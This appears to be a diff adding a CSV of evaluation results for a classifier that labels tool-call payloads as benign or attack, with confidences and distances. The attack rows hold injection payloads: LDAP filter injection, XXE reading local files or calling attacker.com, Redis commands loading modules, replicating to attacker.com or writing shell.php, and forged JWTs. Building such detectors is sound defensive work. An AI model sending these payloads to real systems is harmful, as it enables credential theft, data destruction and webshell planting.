@@ -1,0 +1,305 @@
+tool_name,payload,true_label,pred_label,confidence,dist_benign,dist_attack
+graphql_query,"{""query"": ""query { user(id: 4) { name email } }""}",benign,benign,0.8603389640709183,0.008222401142120361,0.014010488986968994
+graphql_query,"{""query"": ""query { searchProducts(query: \""laptop\"") { id name } }""}",benign,attack,0.7251568366944866,0.019562602043151855,0.015210509300231934
+graphql_query,"{""query"": ""query { order(id: 22) { total status } }""}",benign,benign,0.9694348583792575,0.010173439979553223,0.022094249725341797
+graphql_query,"{""query"": ""mutation { updateItem(id: 6, status: \""active\"") { id } }""}",benign,attack,0.583993238281297,0.024782001972198486,0.02385711669921875
+graphql_query,"{""query"": ""query { user(id: 18) { name email } }""}",benign,benign,0.8301861389470887,0.010054528713226318,0.016067445278167725
+graphql_query,"{""query"": ""query { user(id: 0) { name email } }""}",benign,benign,0.9016158604806146,0.008001446723937988,0.014912724494934082
+graphql_query,"{""query"": ""query { product(id: 34) { name price } }""}",benign,benign,1.0,0.010224997997283936,0.02541142702102661
+graphql_query,"{""query"": ""query { products(first: 10) { edges { node { name price } } } }""}",benign,attack,0.5756532738239836,0.02799522876739502,0.02897089719772339
+graphql_query,"{""query"": ""query { product(id: 8) { name price } }""}",benign,benign,1.0,0.009138822555541992,0.024127483367919922
+graphql_query,"{""query"": ""{ __typename }""}",benign,benign,0.7087479288884534,0.024310171604156494,0.0302426815032959
+graphql_query,"{""query"": ""mutation { updateItem(id: 24, status: \""active\"") { id } }""}",benign,attack,0.6207170945927998,0.02617013454437256,0.024777770042419434
+graphql_query,"{""query"": ""query { product(id: 14) { name price } }"", ""variables"": {""id"": ""123""}",benign,benign,0.8215128288180433,0.024358093738555908,0.03821992874145508
+graphql_query,"{""query"": ""mutation { createPost(title: \""Test\"") { id } }""}",benign,attack,0.6731816784091411,0.022726476192474365,0.021011650562286377
+graphql_query,"{""query"": ""query { me { id name email } }""}",benign,attack,0.672362300523879,0.012991607189178467,0.011238276958465576
+graphql_query,"{""query"": ""query { categories { id name products { name } } }""}",benign,benign,0.7048526638899694,0.019623279571533203,0.024220407009124756
+graphql_query,"{""query"": ""query { comments(postId: 20) { id text } }""}",benign,benign,0.7474159568502887,0.013586819171905518,0.018285274505615234
+graphql_query,"{""query"": ""query { user(id: 1) { name email } }""}",benign,benign,0.9061645309618929,0.007638812065124512,0.014380276203155518
+graphql_query,"{""query"": ""query { user(id: 32) { name email } }""}",benign,benign,0.8487424884385084,0.01009070873260498,0.016772806644439697
+graphql_query,"{""query"": ""query { posts(first: 15) { edges { node { title } } } }"", ""variables""",benign,benign,0.6459880997551951,0.02908766269683838,0.03189200162887573
+graphql_query,"{""query"": ""mutation { updateItem(id: 16, status: \""active\"") { id } }""}",benign,attack,0.5294629997822053,0.025583624839782715,0.025244593620300293
+graphql_query,"{""query"": ""mutation { createPost(title: \""Hello\"") { id } }""}",benign,attack,0.675095362874025,0.020821809768676758,0.019234001636505127
+graphql_query,"{""query"": ""query GetUser($id: ID!) { user(id: $id) { name } }"", ""variables"": {""i",benign,benign,0.752801781468464,0.026585936546325684,0.036176085472106934
+graphql_query,"{""query"": ""query { product(id: 36) { name price } }""}",benign,benign,1.0,0.01038450002670288,0.026087403297424316
+graphql_query,"{""query"": ""query { comments(postId: 30) { id text } }""}",benign,benign,0.749817670004439,0.014021873474121094,0.01896369457244873
+graphql_query,"{""query"": ""query { comments(postId: 26) { id text } }""}",benign,benign,0.7396478696727609,0.014349162578582764,0.019007325172424316
+graphql_query,"{""query"": ""query { user(id: 2) { name email } }"", ""variables"": {""id"": ""123""}}",benign,benign,0.7584749562043549,0.016998291015625,0.023400485515594482
+graphql_query,"{""query"": ""mutation { updateItem(id: 12, status: \""active\"") { id } }""}",benign,attack,0.5478343854788283,0.02690303325653076,0.02632659673690796
+graphql_query,"{""query"": ""mutation { updateUser(id: 1, name: \""John\"") { id } }""}",benign,attack,0.592534499882009,0.024818599224090576,0.02588069438934326
+graphql_query,"{""query"": ""query { orders(status: PENDING) { id total } }""}",benign,benign,0.903395460887829,0.013155221939086914,0.024614334106445312
+graphql_query,"{""query"": ""query { order(id: 28) { total status } }""}",benign,benign,0.989019891147771,0.009813666343688965,0.02231067419052124
+graphql_query,"{""query"": ""query { users { email passwordHash } }""}",attack,attack,1.0,0.028891324996948242,0.010428965091705322
+graphql_query,"{""query"": ""query { users(first: 999999999) { edges { node { id } } } }""}",attack,attack,0.6830188021508264,0.042185187339782715,0.038828492164611816
+graphql_query,"{""query"": ""{\""query\"": \""query { user(id: \\\""1 OR 1=1\\\"") { name } }\""}""}",attack,attack,1.0,0.0621524453163147,0.064189612865448
+graphql_query,"{""query"": ""query { auditLogs { action userId ipAddress } }""}",attack,attack,0.9735855000851816,0.04530620574951172,0.020661592483520508
+graphql_query,"{""query"": ""mutation { deleteAllUsers { count } }""}",attack,attack,0.8924532913358129,0.03110969066619873,0.017030835151672363
+graphql_query,"{""query"": ""query { __schema { types { name fields { name } } } }""}",attack,attack,0.5327985961438884,0.024009883403778076,0.023655951023101807
+graphql_query,"{""query"": ""query { __type(name: \""User\"") { fields { name type { name } } } }""}",attack,benign,0.6778795811544782,0.023868799209594727,0.0279005765914917
+graphql_query,"{""query"": ""query { admin { apiKey secretToken } }""}",attack,attack,1.0,0.027434349060058594,0.009416759014129639
+graphql_query,"{""query"": ""query x($id: String!) { user(id: $id) { name } }"", ""variables"": {""id""",attack,benign,0.6806487870175023,0.023878931999206543,0.0280684232711792
+graphql_query,"{""query"": ""query { a]};alert(1)// }""}",attack,attack,0.5090390905467699,0.02835536003112793,0.028471648693084717
+ldap_query,"{""filter"": ""(cn=User 18)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.9867398344325637,0.005114078521728516,0.011564254760742188
+ldap_query,"{""filter"": ""(objectClass=person)"", ""base"": ""dc=example,dc=com""}",benign,attack,0.8066563489963563,0.0188332200050354,0.012382328510284424
+ldap_query,"{""filter"": ""(uid=user14)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,1.0,0.007490634918212891,0.02283257246017456
+ldap_query,"{""filter"": ""(title=Engineer)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.8662416757076085,0.022554457187652588,0.03892207145690918
+ldap_query,"{""filter"": ""(mail=user12@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9328235458296772,0.01703166961669922,0.03402429819107056
+ldap_query,"{""filter"": ""(sn=Smith)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9729179793127557,0.012338876724243164,0.027014434337615967
+ldap_query,"{""filter"": ""(&(department=IT)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=n",benign,attack,0.6342783721786567,0.013559103012084961,0.01597285270690918
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.5269899414431645,0.009945511817932129,0.010277748107910156
+ldap_query,"{""filter"": ""(telephoneNumber=*)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,benign,0.7270898883959268,0.011310458183288574,0.014603912830352783
+ldap_query,"{""filter"": ""(mail=user34@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.920782504654695,0.01896357536315918,0.036875903606414795
+ldap_query,"{""filter"": ""(&(department=dept4)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.5465435533951825,0.011184275150299072,0.010568022727966309
+ldap_query,"{""filter"": ""(cn=John Doe)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,benign,0.9997924376591347,0.008153140544891357,0.019014596939086914
+ldap_query,"{""filter"": ""(cn=User 28)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.9661476396326802,0.005431652069091797,0.011706888675689697
+ldap_query,"{""filter"": ""(uid=john)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.888589089672244,0.004953861236572266,0.008973002433776855
+ldap_query,"{""filter"": ""(mail=user6@example.com)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.919959477169195,0.013806343078613281,0.026798129081726074
+ldap_query,"{""filter"": ""(employeeNumber=2)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.7967977176452841,0.01460033655166626,0.021754980087280273
+ldap_query,"{""filter"": ""(uid=user36)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,1.0,0.006830573081970215,0.021640658378601074
+ldap_query,"{""filter"": ""(mail=user16@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9298055261958027,0.017313480377197266,0.034353554248809814
+ldap_query,"{""filter"": ""(employeeNumber=20)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.8507365188368985,0.014469146728515625,0.024153172969818115
+ldap_query,"{""filter"": ""(employeeNumber=22)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.8277996888688613,0.014070093631744385,0.02237147092819214
+ldap_query,"{""filter"": ""(mail=user32@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.8099078937515009,0.014981746673583984,0.022942304611206055
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.6655438134838637,0.013488173484802246,0.01651102304458618
+ldap_query,"{""filter"": ""(&(department=dept6)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.6263565981489401,0.015127241611480713,0.017648041248321533
+ldap_query,"{""filter"": ""(mail=*@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.7279596548021299,0.015023231506347656,0.019432127475738525
+ldap_query,"{""filter"": ""(employeeNumber=0)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,benign,0.9279844632160484,0.0064626336097717285,0.01277095079421997
+ldap_query,"{""filter"": ""(uid=user8)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,1.0,0.004477083683013916,0.01361018419265747
+ldap_query,"{""filter"": ""(employeeNumber=24)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,benign,0.9485793587895892,0.015233755111694336,0.03153711557388306
+ldap_query,"{""filter"": ""\\00*)(uid=admin"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.5119284400456786,0.012436330318450928,0.01261824369430542
+ldap_query,"{""filter"": ""(uid=admin)"", ""base"": ""ou=admins,dc=corp,dc=net""}",attack,attack,0.607987891395324,0.013090848922729492,0.014932870864868164
+ldap_query,"{""filter"": ""(objectClass=*)"", ""base"": ""cn=admin,dc=example,dc=com""}",attack,attack,0.9918102309556154,0.017781376838684082,0.007770061492919922
+ldap_query,"{""filter"": ""*)(|(objectClass=*))"", ""base"": ""dc=corp,dc=net""}",attack,attack,1.0,0.026483118534088135,0.007898271083831787
+ldap_query,"{""filter"": ""(memberOf=cn=Domain Admins)"", ""base"": ""dc=example,dc=com""}",attack,attack,0.5170293498922381,0.009014010429382324,0.009202837944030762
+ldap_query,"{""filter"": ""admin)(|(password=*)"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.6919767681095933,0.013157129287719727,0.010403931140899658
+ldap_query,"{""filter"": ""*)(objectClass=*"", ""base"": ""dc=example,dc=com""}",attack,attack,1.0,0.02535879611968994,0.008963525295257568
+ldap_query,"{""filter"": "")(cn=*)(|(cn=*"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.8979127964960911,0.034802019596099854,0.018825650215148926
+ldap_query,"{""filter"": ""*)(uid=*))(|(uid=*"", ""base"": ""dc=example,dc=com""}",attack,attack,1.0,0.026679039001464844,0.010506749153137207
+parse_xml,"{""xml"": ""<config><item id=\""18\"">value</item></config>""}",benign,benign,1.0,0.01071321964263916,0.025441229343414307
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>12</id></data>""}",benign,benign,0.9634980434200551,0.012754857540130615,0.027323126792907715
+parse_xml,"{""xml"": ""<users><user id=\""1\""><name>John</name></user></users>""}",benign,benign,0.9538916091511527,0.014087557792663574,0.029519855976104736
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>2</id></data>""}",benign,benign,0.9438062298754606,0.013203084468841553,0.0270383358001709
+parse_xml,"{""xml"": ""<users><user id=\""10\""><name>User10</name></user></users>""}",benign,benign,0.9384669734669762,0.015940189361572266,0.03225147724151611
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 22</message></response>""}",benign,benign,0.8324094538646315,0.021733462810516357,0.03489428758621216
+parse_xml,"{""xml"": ""<order id=\""8\""><status>pending</status></order>""}",benign,benign,0.8743412760806208,0.019835591316223145,0.03483361005783081
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 28</message></response>""}",benign,benign,0.8216983949335956,0.021830320358276367,0.03426700830459595
+parse_xml,"{""xml"": ""<note><to>User</to><from>Admin</from><body>Hello</body></note>""}",benign,benign,0.8118947540836299,0.030719220638275146,0.047237932682037354
+parse_xml,"{""xml"": ""<order id=\""24\""><status>pending</status></order>""}",benign,benign,0.8731875506853393,0.02063775062561035,0.036152005195617676
+parse_xml,"{""xml"": ""<feed><entry><title>Hello</title></entry></feed>""}",benign,benign,0.8758757252830087,0.02794700860977173,0.04924142360687256
+parse_xml,"{""xml"": ""<order><id>123</id><items><item>Book</item></items></order>""}",benign,benign,0.9192412052558762,0.029210209846496582,0.056606411933898926
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><item>test</item></data>""}",benign,benign,1.0,0.01146787405014038,0.028926372528076172
+parse_xml,"{""xml"": ""<users><user id=\""16\""><name>User16</name></user></users>""}",benign,benign,0.908145963866131,0.017026185989379883,0.03219282627105713
+parse_xml,"{""xml"": ""<config><item id=\""30\"">value</item></config>""}",benign,benign,1.0,0.010693907737731934,0.026905417442321777
+parse_xml,"{""xml"": ""<users><user id=\""26\""><name>User26</name></user></users>""}",benign,benign,0.9098627751861996,0.01573401689529419,0.02986276149749756
+parse_xml,"{""xml"": ""<products><product><name>Widget</name><price>9.99</price></product></pr",benign,benign,0.7993954675349842,0.05119842290878296,0.07670098543167114
+parse_xml,"{""xml"": ""<config><item id=\""0\"">value</item></config>""}",benign,benign,1.0,0.010659992694854736,0.026428163051605225
+parse_xml,"{""xml"": ""<config><item id=\""6\"">value</item></config>""}",benign,benign,1.0,0.010397613048553467,0.02616429328918457
+parse_xml,"{""xml"": ""<response status=\""ok\""><message>Success</message></response>""}",benign,benign,0.8495183012874563,0.022925853729248047,0.03817051649093628
+parse_xml,"{""xml"": ""<config><setting name=\""debug\"">false</setting></config>""}",benign,attack,0.670374419468012,0.02071225643157959,0.026283860206604004
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>4</id></data>""}",benign,benign,0.9390369798030089,0.013073086738586426,0.02648460865020752
+parse_xml,"{""xml"": ""<config><item id=\""20\"">value</item></config>""}",benign,benign,1.0,0.009755492210388184,0.0258786678314209
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 14</message></response>""}",benign,benign,0.8372443335122033,0.02101588249206543,0.03408926725387573
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///et",attack,attack,1.0,0.05813676118850708,0.019448518753051758
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.",attack,attack,0.9157757481566494,0.04256868362426758,0.022136390209197998
+parse_xml,"{""xml"": ""<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode",attack,attack,1.0,0.04629838466644287,0.018016159534454346
+parse_xml,"{""xml"": ""<credentials><username>admin</username><password>secret</password></cre",attack,attack,0.6504418773308159,0.032707810401916504,0.04035651683807373
+parse_xml,"{""xml"": ""<config><apiKey>sk-xxx</apiKey></config>""}",attack,attack,0.5486811139900747,0.032609522342681885,0.034896254539489746
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/",attack,attack,1.0,0.04037642478942871,0.008980631828308105
+parse_xml,"{""xml"": ""<!DOCTYPE :[ <!ENTITY x SYSTEM \""file:///dev/random\""> ]><x>&x;</x>""}",attack,attack,0.9369236486800793,0.03262650966644287,0.0161818265914917
+parse_xml,"{""xml"": ""<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%d",attack,attack,1.0,0.061163485050201416,0.023175597190856934
+redis_command,"{""command"": ""GET"", ""args"": [""session:18""]}",benign,benign,0.9524762090521787,0.007114410400390625,0.014859795570373535
+redis_command,"{""command"": ""GET"", ""args"": [""session:22""]}",benign,benign,0.9900094587383959,0.006848752498626709,0.015606522560119629
+redis_command,"{""command"": ""HGET"", ""args"": [""user:28"", ""name""]}",benign,benign,0.7354555879846774,0.00933527946472168,0.0122605562210083
+redis_command,"{""command"": ""HSET"", ""args"": [""user:1"", ""email"", ""john@example.com""]}",benign,attack,0.7391546309180907,0.030876994132995605,0.023333370685577393
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:14"", ""3600""]}",benign,benign,0.7677775359862925,0.019208431243896484,0.02695333957672119
+redis_command,"{""command"": ""HGET"", ""args"": [""user:6"", ""name""]}",benign,benign,0.7023928624737786,0.009301245212554932,0.011423289775848389
+redis_command,"{""command"": ""INCR"", ""args"": [""counter""]}",benign,attack,0.5971703140502566,0.01448148488998413,0.013864994049072266
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:38""]}",benign,benign,0.8078228775002883,0.01254361867904663,0.01912510395050049
+redis_command,"{""command"": ""SADD"", ""args"": [""tags"", ""python""]}",benign,attack,0.7837478684780163,0.01904308795928955,0.013131141662597656
+redis_command,"{""command"": ""ZADD"", ""args"": [""leaderboard"", ""100"", ""user1""]}",benign,attack,0.5943981388409125,0.02363497018814087,0.022656917572021484
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:0"", ""task0""]}",benign,attack,0.6706083129967894,0.01684272289276123,0.01818007230758667
+redis_command,"{""command"": ""HGET"", ""args"": [""user:10"", ""name""]}",benign,benign,0.6982825343369231,0.010715126991271973,0.01305091381072998
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue"", ""task1""]}",benign,attack,0.5619083106957068,0.016642630100250244,0.016187727451324463
+redis_command,"{""command"": ""HGET"", ""args"": [""user:1"", ""name""]}",benign,benign,0.6587829250682148,0.010891318321228027,0.012251734733581543
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page"", ""data""]}",benign,benign,0.8299591290510554,0.012630283832550049,0.02017390727996826
+redis_command,"{""command"": ""GET"", ""args"": [""session:123""]}",benign,benign,1.0,0.006087958812713623,0.01424795389175415
+redis_command,"{""command"": ""GET"", ""args"": [""session:2""]}",benign,benign,0.914681884382013,0.007276177406311035,0.013958275318145752
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:20""]}",benign,benign,0.7838940502482508,0.01320868730545044,0.019161343574523926
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:36"", ""data""]}",benign,benign,0.9589312761768843,0.01103222370147705,0.023386001586914062
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:30""]}",benign,benign,0.8044465851322485,0.01404029130935669,0.021256625652313232
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:32""]}",benign,benign,0.8668819552944744,0.010966718196868896,0.01895129680633545
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:4"", ""data""]}",benign,benign,0.9347727448125378,0.011633694171905518,0.023342907428741455
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:3"", ""task8""]}",benign,benign,0.6649213997260492,0.016316652297973633,0.01858234405517578
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:1"", ""task26""]}",benign,benign,0.6759627952706455,0.01663738489151001,0.01937282085418701
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:12""]}",benign,benign,0.8007932695387086,0.012754678726196289,0.019163668155670166
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:24""]}",benign,benign,0.8237067482802555,0.012489914894104004,0.019688427448272705
+redis_command,"{""command"": ""TTL"", ""args"": [""session:123""]}",benign,benign,0.8231426863980544,0.011665165424346924,0.018366515636444092
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:16"", ""3600""]}",benign,benign,0.7976110454435106,0.016744494438171387,0.02499210834503174
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""cache:key"", ""3600""]}",benign,benign,0.9848328528458292,0.009791672229766846,0.022042512893676758
+redis_command,"{""command"": ""GET"", ""args"": [""session:34""]}",benign,benign,1.0,0.005925178527832031,0.015401065349578857
+redis_command,"{""command"": ""DEBUG"", ""args"": [""SEGFAULT""]}",attack,attack,0.9278818528499146,0.036911189556121826,0.018682897090911865
+redis_command,"{""command"": ""KEYS"", ""args"": [""*""]}",attack,benign,0.7119606235132916,0.012766122817993164,0.01598513126373291
+redis_command,"{""command"": ""EVAL"", ""args"": [""return os.execute('id')"", ""0""]}",attack,attack,0.7004000643117277,0.02565741539001465,0.020975470542907715
+redis_command,"{""command"": ""MODULE"", ""args"": [""LOAD"", ""/tmp/malicious.so""]}",attack,attack,0.7810867003551889,0.02676379680633545,0.018556833267211914
+redis_command,"{""command"": ""CONFIG"", ""args"": [""GET"", ""requirepass""]}",attack,attack,0.8595118816934617,0.01828104257583618,0.010747730731964111
+redis_command,"{""command"": ""FLUSHALL"", ""args"": []}",attack,attack,0.8382791774274087,0.02128499746322632,0.013093352317810059
+redis_command,"{""command"": ""SLAVEOF"", ""args"": [""attacker.com"", ""6379""]}",attack,attack,0.7800950417586942,0.03356921672821045,0.0233231782913208
+redis_command,"{""command"": ""INFO"", ""args"": []}",attack,attack,0.6450631983402656,0.015208005905151367,0.013896465301513672
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dir"", ""/var/www/html""]}",attack,attack,0.8610398985448124,0.03179001808166504,0.018628716468811035
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dbfilename"", ""shell.php""]}",attack,attack,0.8789536732626475,0.03933095932006836,0.022173941135406494
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.sig""}",benign,benign,0.9232853501830988,0.011330962181091309,0.02215719223022461
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005948960781097412,0.0187302827835083
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005248844623565674,0.01865476369857788
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00477975606918335,0.016735196113586426
+verify_jwt,"{""token"": ""eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig""}",benign,attack,0.6988166881923261,0.01178056001663208,0.01628774404525757
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005052030086517334,0.015657782554626465
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.0058335065841674805,0.016327857971191406
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005943655967712402,0.01788461208343506
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00503772497177124,0.01657778024673462
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005118131637573242,0.015841186046600342
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sig""}",benign,attack,0.6357625024532653,0.020457029342651367,0.01641404628753662
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2Vy",benign,attack,0.6497199814423529,0.03848457336425781,0.030181169509887695
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005186915397644043,0.016557931900024414
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005361080169677734,0.018294930458068848
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.005934417247772217,0.017866909503936768
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.004617750644683838,0.015390098094940186
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFt",benign,attack,1.0,0.05501580238342285,0.04315108060836792
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00506061315536499,0.01597219705581665
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.004910647869110107,0.01746267080307007
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.0058209896087646484,0.01877009868621826
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,1.0,0.00556570291519165,0.017374098300933838
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJy",attack,attack,0.9428420569554437,0.02639162540435791,0.012915492057800293
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig"", ""ke",attack,attack,0.5863309363119229,0.03363502025604248,0.02925020456314087
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig""}",attack,attack,0.5463603373107624,0.020971596240997314,0.022603213787078857
+verify_jwt,"{""token"": ""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}",attack,attack,1.0,0.04869365692138672,0.014136075973510742
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiY",attack,attack,0.920281416473437,0.04094952344894409,0.021081984043121338
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd",attack,attack,0.8562886591689618,0.03526031970977783,0.0208737850189209
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret""}",attack,attack,1.0,0.027233481407165527,0.008120298385620117
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/18/""}",benign,attack,0.5594559736806185,0.035231709480285645,0.032168030738830566
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report10.csv""}",benign,attack,0.5649655352334818,0.024554848670959473,0.02712148427963257
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/""}",benign,attack,0.6230561932763246,0.03614848852157593,0.029931724071502686
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/2/""}",benign,attack,0.5952999395223763,0.03391784429550171,0.029311060905456543
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user24/file.txt""}",benign,benign,1.0,0.008392274379730225,0.021529734134674072
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/14/""}",benign,attack,0.5589256257368953,0.03384053707122803,0.03092294931411743
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/8/""}",benign,attack,0.5473568849808803,0.031816720962524414,0.029593348503112793
+s3_operation,"{""operation"": ""list"", ""bucket"": ""logs"", ""prefix"": ""2024/01/""}",benign,attack,0.5157230169534301,0.02435755729675293,0.024950265884399414
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user12/file.txt""}",benign,benign,1.0,0.007184147834777832,0.021857917308807373
+s3_operation,"{""operation"": ""put"", ""bucket"": ""backups"", ""key"": ""2024/backup.sql""}",benign,benign,0.8809424392343288,0.013815760612487793,0.02461165189743042
